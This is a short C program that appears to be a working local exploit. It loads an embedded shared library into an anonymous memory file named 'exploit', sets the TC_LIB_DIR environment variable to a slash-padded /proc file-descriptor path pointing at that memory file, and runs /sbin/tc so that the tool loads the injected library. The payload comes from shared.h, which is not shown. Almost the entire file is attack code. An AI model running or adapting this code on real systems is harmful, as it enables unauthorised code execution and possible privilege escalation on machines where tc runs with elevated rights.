#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <string.h>
#include <fcntl.h>


#ifndef __NR_memfd_create
#define __NR_memfd_create 319
#endif

#include "shared.h"

static inline int memfd_create(const char *name, unsigned int flags) {
    return syscall(__NR_memfd_create, name, flags);
}

extern char **environ;

int main(int argc, char **argv) {
    int fd = memfd_create("exploit", 0);
    if (fd == -1) {
        perror("memfd_create");
        return 1;
    }

    if (write(fd, x_so, sizeof(x_so)) != sizeof(x_so)) {
        perror("write");
        return 1;
    }

    pid_t pid = fork();
    if (pid == -1) {
        perror("fork");
        return 1;
    }

    if (pid == 0) { // child
        char tc_lib_dir_val[256];
        char path[128];
        snprintf(path, sizeof(path), "/proc/%d/fd/%d", getpid(), fd);

        // fill with slashes
        memset(tc_lib_dir_val, '/', sizeof(tc_lib_dir_val));
        tc_lib_dir_val[sizeof(tc_lib_dir_val) - 1] = '\0';

        size_t path_len = strlen(path);
        size_t buf_len  = sizeof(tc_lib_dir_val) - 1; // leave room for '\0'

        size_t start = buf_len - path_len;
        memcpy(tc_lib_dir_val + start, path, path_len);

        puts(tc_lib_dir_val);

        if (setenv("TC_LIB_DIR", tc_lib_dir_val, 1) != 0) {
            perror("setenv");
            return 1;
        }

        char *tc_argv[] = {"tc", "exec", "x", NULL};
        execve("/sbin/tc", tc_argv, environ);
        perror("execve");
        exit(1);
    } else { // parent
        wait(NULL);
    }

    return 0;
}
